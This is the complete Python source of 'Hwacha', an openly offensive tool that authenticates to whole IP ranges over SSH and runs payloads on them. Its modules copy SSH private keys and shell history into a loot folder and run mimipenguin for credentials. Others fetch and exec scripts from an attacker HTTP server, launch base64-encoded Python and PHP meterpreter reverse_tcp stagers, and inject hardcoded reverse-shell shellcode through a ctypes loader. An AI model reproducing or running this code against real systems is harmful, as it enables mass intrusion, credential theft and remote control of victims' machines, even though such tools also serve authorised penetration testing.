import os
import sys
import time
import base64
import thread
import socket
import random
import shutil
import string
import paramiko
import argparse
import threading
import SocketServer
import SimpleHTTPServer
from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
CRED = '\033[91m'
CEND = '\033[0m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
if not os.path.exists("logs"):
    os.makedirs("logs")
paramiko.util.log_to_file("logs/paramiko.log")


def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))


def connect(ip, username, password, identity_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
    try:
        if identity_file:
            key_path = identity_file
            key = paramiko.RSAKey.from_private_key_file(key_path)
            if password:
                key = paramiko.RSAKey.from_private_key_file(key_path, password=password)
                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
            else:
                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
        else:
            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
        print CGREEN + "[+] Successful authentication to " + str(ip) + "!" + CEND
    except socket.timeout:
        print CRED + "[-] Failed to connect to " + str(ip) + CEND
        return False
    except socket.error:
        print CRED + "[-] Failed to connect to " + str(ip) + CEND
        return False
    except paramiko.ssh_exception.AuthenticationException:
        print CRED + "[!] Authentication failed on " + str(ip) + "!" + CEND
        return False
    return client


def sudo_exec(ip, username, password, identity_file, file, timeout):
    client = connect(ip, username, password, identity_file)
    if client:
        print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
        sftp = client.open_sftp()
        filename = randomword(10)
        sftp.put(file, filename)
        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename + ";sudo ./" + filename, timeout=timeout, get_pty = True)
        if password:
            stdin.write(password + '\n')
            stdin.flush()
        try:
            for line in stdout:
                print ""
        except socket.timeout:
            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND


def copy_exec(ip, username, password, identity_file, file, timeout):
    client = connect(ip, username, password, identity_file)
    if client:
        print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
        sftp = client.open_sftp()
        filename = randomword(10)
        sftp.put(file, filename)
        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename +"; sleep 1; rm " + filename + " & ./" + filename, timeout=timeout)
        try:
            for line in stdout:
                print line
        except socket.timeout:
            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND


def steal(ip, username, password, identity_file, type, timeout):
    client = connect(ip, username, password, identity_file)
    if client:
        if type == "keys":
            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  };"
            command += " FNR>1 {nextfile}' {} + 2>/dev/null "
        if type == "history":
            command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        try:
            sftp = client.open_sftp()
            for line in stdout:
                line = line.rstrip()
                if not os.path.exists("loot/" + type + "/" + str(ip)):
                    os.makedirs("loot/" + type + "/" + str(ip))
                print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
                try:
                    sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
                except:
                    print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
        except socket.timeout:
            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND


def execute_command(ip, username, password, identity_file, command, timeout):
    client = connect(ip, username, password, identity_file)
    try:
        if client:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            print CGREEN + "[+] Executed on " + str(ip) + "..." + CEND
            for line in stdout:
                print line.strip()
    except socket.timeout:
        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND


def check_privs(ip, username, password, identity_file, timeout):
    client = connect(ip, username, password, identity_file)
    try:
        if client != False:
            stdin, stdout, stderr = client.exec_command("sudo --list", timeout=timeout, get_pty = True)
            if password:
                stdin.write(password + '\n')
                stdin.flush()
                for line in stdout:
                    if "may run the following commands on" in line:
                        print line.strip()
                        for line in stdout:
                            print line.strip()

    except socket.timeout:
        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND


def start_thread(targets, function, args):
    for ip in targets:
        if function == "execute_command":
            t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4],args[5]))
            t.start()
        time.sleep(.2)
        if function == "copy_exec":
            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4],args[5]))
            t.start()
        time.sleep(.2)
        if function == "steal":
            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4],args[5]))
            t.start()
        time.sleep(.2)
        if function == "check_privs":
            t = threading.Thread(target=check_privs, args=(ip, args[1], args[2], args[3], args[4]))
            t.start()
        time.sleep(.2)
        if function == "login":
            t = threading.Thread(target=connect, args=(ip, args[1], args[2], args[3]))
            t.start()
        if function == "sudo_exec":
            t = threading.Thread(target=sudo_exec, args=(ip, args[1], args[2], args[3], args[4], args[5]))
            t.start()


def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password, identity_file):
    stager = '''
import socket,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('%s',%s))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})

    ''' % (listen_ip, listen_port)
    payload = base64.b64encode(stager, 'utf-8')
    print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
    command = "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &"
    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])


def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, password, identity_file):

        stager = '''
    error_reporting(0);
    $ip   = '%s';
    $port = %s;
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();

    ''' % (listen_ip, listen_port)
        payload = base64.b64encode(stager, 'utf-8')
        print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
        command = "php -r 'eval(base64_decode(\"" + payload + "\"));'"
        start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])


def start_server(a,PORT):
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "serving at port", PORT
    httpd.serve_forever()


def get_ip():
    local_ip = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [
        [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
         [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
    return local_ip


def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
    print CGREEN + "[!] Spinning up HTTP server..." + CEND
    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
    time.sleep(3)
    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
    print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 100])


def web_delivery(lhost, lport, targets, port, username, password, identity_file, file):
    shutil.copyfile(file, 'payloads/custom.py')
    print CGREEN + "[!] Spinning up HTTP server..." + CEND
    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
    time.sleep(3)
    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/custom.py'); exec(r.read());\" | python &"
    print CGREEN + "[!] Executing payload on the targets..." + CEND
    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])


def parse_targets(target):
    #Stolen from CrackMapExec
    if '-' in target:
        ip_range = target.split('-')
        try:
            hosts = IPRange(ip_range[0], ip_range[1])
        except AddrFormatError:
            try:
                start_ip = IPAddress(ip_range[0])

                start_ip_words = list(start_ip.words)
                start_ip_words[-1] = ip_range[1]
                start_ip_words = [str(v) for v in start_ip_words]

                end_ip = IPAddress('.'.join(start_ip_words))

                t = IPRange(start_ip, end_ip)
            except AddrFormatError:
                t = target
    else:
        try:
            t = IPNetwork(target)
        except AddrFormatError:
            t = target

    if type(t) == IPNetwork or type(t) == IPRange:
        return list(t)
    else:
        return [t.strip()]


def shellcode_meterpreter_64(port,ip):
    hex_port = make_port(port)
    hex_ip = make_ip(ip)
    shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d'
    shellcode += '\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0'
    shellcode += '\\x78\\x5b\\x6a\\x0a\\x41\\x59\\x56\\x50\\x6a\\x29\\x58\\x99\\x6a'
    shellcode += '\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x44\\x48'
    shellcode += '\\x97\\x48\\xb9\\x02\\x00' + hex_port + hex_ip + '\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a'
    shellcode += '\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x85\\xc0\\x79\\x1b\\x49\\xff\\xc9'
    shellcode += '\\x74\\x22\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48'
    shellcode += '\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e'
    shellcode += '\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58'
    shellcode += '\\x6a\\x01\\x5f\\x0f\\x05'
    return shellcode


def shellcode_meterpreter_32(port,ip):
    hex_port = make_port(port)
    hex_ip = make_ip(ip)
    shellcode = "\\x6a\\x0a\\x5e\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\xb0"
    shellcode += "\\x66\\x89\\xe1\\xcd\\x80\\x97\\x5b\\x68" +  hex_ip + "\\x68"
    shellcode += "\\x02\\x00" + hex_port  + "\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x57\\x89"
    shellcode += "\\xe1\\x43\\xcd\\x80\\x85\\xc0\\x79\\x19\\x4e\\x74\\x3d\\x68\\xa2"
    shellcode += "\\x00\\x00\\x00\\x58\\x6a\\x00\\x6a\\x05\\x89\\xe3\\x31\\xc9\\xcd"
    shellcode += "\\x80\\x85\\xc0\\x79\\xbd\\xeb\\x27\\xb2\\x07\\xb9\\x00\\x10\\x00"
    shellcode += "\\x00\\x89\\xe3\\xc1\\xeb\\x0c\\xc1\\xe3\\x0c\\xb0\\x7d\\xcd\\x80"
    shellcode += "\\x85\\xc0\\x78\\x10\\x5b\\x89\\xe1\\x99\\xb6\\x0c\\xb0\\x03\\xcd"
    shellcode += "\\x80\\x85\\xc0\\x78\\x02\\xff\\xe1\\xb8\\x01\\x00\\x00\\x00\\xbb"
    shellcode += "\\x01\\x00\\x00\\x00\\xcd\\x80"
    return shellcode


def build_macho(m_ip, m_port):
    with open('templates/meterpreter_baseline', 'r') as file:
        filedata = file.read()
    filedata = filedata.replace('100.100.100.100:65535\"\x20', m_ip + ':' + m_port + '\"\x20' + (20 - len(m_ip+m_port)) * "\x00")
    return filedata


def invoke_shellcode(shellcode):
    the_code = '''
#!/usr/bin/env python
from ctypes import *
libc = cdll.LoadLibrary("libc.so.6")
psc = "{0}"
libc.malloc.restype = c_void_p
libc.malloc(0x400)
sc = libc.malloc(0x400)
page = ((sc >> 12) << 12)
page = cast(page, POINTER(c_void_p))
libc.mprotect.argtype = [c_void_p, c_void_p, c_long]
libc.mprotect(page, 1, 7)
index = 0
for c in psc:
    c_int.from_address
    ptr = c_char.from_address(sc + index)
    ptr.value = c
    index += 1
fn = cast(sc, CFUNCTYPE(c_void_p))
fn()
    '''.format(shellcode)
    return "python -c \"exec(\'" + base64.b64encode(the_code) + "\\n\'.decode(\'base64\'))\" &"


def make_ip(ip_address):
    ip_address =ip_address.split(".")
    hex_ip = ""
    for octet in ip_address:
        hex_ip += ('\\x' + str(hex(int(octet)))[2:4].zfill(2))
    return hex_ip


def make_port(port):
    hex_port = ""
    port = str(hex(int(port)))[2::].zfill(4)
    hex_port += '\\x' + port[0:2].zfill(2)
    hex_port += '\\x' + port[2:4].zfill(2)
    return hex_port


def examples():
    print 'To run commands, use -x [COMMAND]'
    print 'to run modules, use -m [MODULE]'
    print 'to specify module options, use -o [ARG=ARG ARG=ARG]'
    print 'to see all available modules, use -L'
    print CRED + 'Example usage:' + CEND
    print CYELLOW + 'python hwacha.py -t 192.168.1.1/24 -u admin  -p password' + CEND
    print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys' + CEND
    print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -i loot/keys/192.168.1.101/id_rsa -x id' + CEND
    print CYELLOW + 'python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o \"LPORT=4444 LHOST=192.168.1.150 TYPE=64\"' + CEND


def print_modules():
    print ""
    print CRED + "Available Modules:" + CEND
    print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
    print    "                              REQURED ARGUMENTS: LHOST , LPORT"
    print "                              OPTIONAL ARGUMENTS: TYPE {python, php, 64, osx}"
    print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
    print "                              OPTIONAL ARGUMENTS: LHOST, LPORT"
    print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
    print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
    print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
    print CYELLOW + "[*] web_delivery" + CEND + "               Use this to execute a python script on the target(s)."
    print    "                              REQURED ARGUMENTS: PATH"
    print "                              OPTIONAL ARGUMENTS: LISTEN"
    print CYELLOW + "[*] custom_bin" + CEND + "               Use this to execute a custom binary on the target(s)."
    print    "                              REQURED ARGUMENTS: PATH"
    print CYELLOW + "[*] sudo_exec" + CEND + "               Use this to execute a custom binary (with sudo) on the target(s)."
    print    "                              REQURED ARGUMENTS: PATH"
    print CYELLOW + "[*] shellcode" + CEND + "               Use this to execute custom shellcode on the target(s)."
    print    "                              REQURED ARGUMENTS: PATH"


def banner():
    art = CGREEN +  """    &&&&     &&         &&        &&
&&&&&&&&&&&& &&         &&        &&      Created by Esteban Rodriguez   /~~\_
   &&&&&&    &&     &&&&&&&&&&    &&	  Web: https://www.n00py.io     /| '` *\\
  &&    &&   &&&&&      &&        &&&&&        Twitter: @n00py1         \|  ___/
 &&      &&  &&&&&    &&  &&      &&&&&   _   _                     _
  &&    &&   &&      &&    &&     &&     | | | |                   | |
   &&&&&&    &&    &&&      &&&   &&     | |_| |__      ____ _  ___| |__   __ _
     &&      &&   &&          &&  &&     |  _  |\ \ /\ / / _` |/ __| '_ \ / _` |
&&&&&&&&&&&&&&&                   &&     | | | | \ V  V / (_| | (__| | | | (_| |
             &&                   &&     \_| |_/  \_/\_/ \__,_|\___|_| |_|\__,_| """ + CEND
    return art


def main():
    parser = argparse.ArgumentParser(description='Hwacha, a tool for sending payloads en masse via SSH')
    parser.add_argument('-t', '--target', help='IP Address, IP range, or subnet', required=False, default=False)
    parser.add_argument('-u','--username', help='SSH username',required=False, default=False)
    parser.add_argument('-p','--password',help='SSH password', required=False, default=False)
    parser.add_argument('-i', '--identity_file', help='SSH key path', required=False, default=False)
    parser.add_argument('-x','--command',help='Command to execute', required=False)
    parser.add_argument('-m', '--module', help='Module to run', required=False)
    parser.add_argument('-o', '--options', help='Options for module', required=False)
    parser.add_argument('-L', '--list', help='List available modules and options', required=False, action='store_true')
    args = parser.parse_args()
    if args.list:
        print banner()
        print_modules()
        sys.exit()
    if not args.target or not args.username and (not args.password or not args.identity_file):
        print banner()
        examples()
        sys.exit()
    targets = parse_targets(args.target)
    if not args.command and not args.module:
        start_thread(targets, "login", [22, args.username, args.password, args.identity_file, 1])
    if args.command:
        print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
        start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, args.command, 10])
    if args.options:
        options = dict(x.split('=') for x in args.options.split(' '))

    if args.module == "mimipenguin":
        if not args.options:
            lport = 8080
        else:
            try:
                lport = options['LISTEN']
            except KeyError:
                print "Must supply an LHOST for use with mimipenguin"
                exit()
        mimipenguin(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file)

    if args.module == "web_delivery":
        lport = 8080
        if not args.options:
            print "The module requires options, You must supply the path of the custom script"
            exit()
        try:
            path = options['PATH']
        except KeyError:
            print "Must supply the path of the custom script"
            exit()
        try:
            lport = options['LISTEN']
        except KeyError:
            lport = 8080
        web_delivery(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file, path)

    if args.module == "custom_bin":
        if not args.options:
            print "The module requires options, You must supply the path of the custom binary"
            exit()
        try:
            path = options['PATH']
        except KeyError:
            print "Must supply the path of the custom binary"
            exit()
        start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, path, 2])

    if args.module == "sudo_exec":
        if not args.options:
            print "The module requires options, You must supply the path of the binary"
            exit()
        try:
            path = options['PATH']
        except KeyError:
            print "Must supply the path of the binary"
            exit()
        start_thread(targets, "sudo_exec", [22, args.username, args.password, args.identity_file, path, 2])

    if args.module == "keys":
        print CGREEN + "[!] Searching system for private keys..." + CEND
        start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "keys", 100])

    if args.module == "history":
        print CGREEN + "[!] Searching system for command history..." + CEND
        start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "history", 100])

    if args.module == "privs":
        print CGREEN + "[!] Checking sudo permissions..." + CEND
        start_thread(targets, "check_privs",[22, args.username, args.password, args.identity_file, 10])

    if args.module == "shellcode":
        if not args.options:
            print "The module requires options, You must supply the path of the shellcode"
            exit()
        try:
            path = options['PATH']
        except KeyError:
            print "Must supply the path of the shellcode"
            exit()
        with open(path, 'r') as code:
            shellcode = code.read().replace('\n', '')
        print CGREEN + "[!] Attempting to execute shellcode..." + CEND
        command = invoke_shellcode(shellcode)
        start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])

    if args.module == "meterpreter":
        if not args.options:
            print "The meterpreter module requires options, You must provide an LHOST and LPORT"
            exit()
        try:
            m_ip = options['LHOST']
        except KeyError:
            print "Must supply an LHOST for use with meterpreter"
            exit()
        try:
            m_port = options['LPORT']
        except KeyError:
            print "Must supply an LPORT for use with meterpreter"
            exit()
        try:
            type = options['TYPE']
        except KeyError:
            type = 'python'
        if type == 'python':
            stager_meterpreter_python(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
        if type == 'php':
            stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
        if type == '64':
            command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port)\
                + " \nPayload: linux/x64/meterpreter/reverse_tcp" + CEND
            start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
        if type == '32':
            command = invoke_shellcode(shellcode_meterpreter_32(m_port, m_ip))
            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) \
                  + " \nPayload: linux/x86/meterpreter/reverse_tcp" + CEND
            start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])

        if type == 'osx':
            try:
                m_ip = options['LHOST']
            except KeyError:
                print "Must supply an LHOST for use with meterpreter"
                exit()
            try:
                m_port = options['LPORT']
            except KeyError:
                print "Must supply an LPORT for use with meterpreter"
                exit()
            payload = build_macho(m_ip, m_port)
            filename = "osx_meterpreter_" + m_ip + "_" + m_port
            if not os.path.exists("output"):
                os.makedirs("output")
            with open('output/' + filename, 'w') as file:
                file.write(payload)
            start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, 'output/' + filename, 2])

if __name__ == "__main__":

    main()
